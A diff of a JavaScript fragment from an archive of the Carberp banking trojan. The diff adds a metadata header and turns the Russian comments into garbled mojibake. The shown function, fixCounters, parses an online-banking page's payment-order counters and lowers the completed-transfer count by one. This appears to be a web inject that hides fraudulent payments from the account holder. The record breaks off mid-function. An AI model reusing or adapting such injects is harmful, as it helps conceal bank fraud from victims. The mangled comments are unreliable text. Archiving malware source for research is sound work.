@@ -1,4 +1,15 @@
-/*Панель навигации, Платежные поручения -> Завершонные*/
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
+/*пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ -> пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ*/
 function fixCounters(a)
 {
 	//&IMPORTED_PAYDOCRU=00&NEW_PAYDOCRU=00&SIGNED_PAYDOCRU=00&INPROCESS_PAYDOCRU=00&REJECTED0GTHEN0_PAYDOCRU=18&COMPLETED_PAYDOCRU=0457
@@ -10,7 +21,7 @@ function fixCounters(a)
 			val = val.split("=");
 			var color = val[1].substr(0,1);
 			
-			/*Уменьшим кол-во завершенных на 1*/
+			/*пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ-пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ 1*/
 			var count = parseInt(val[1].substr(1,val[1].length));
 
 			if(count > 0)
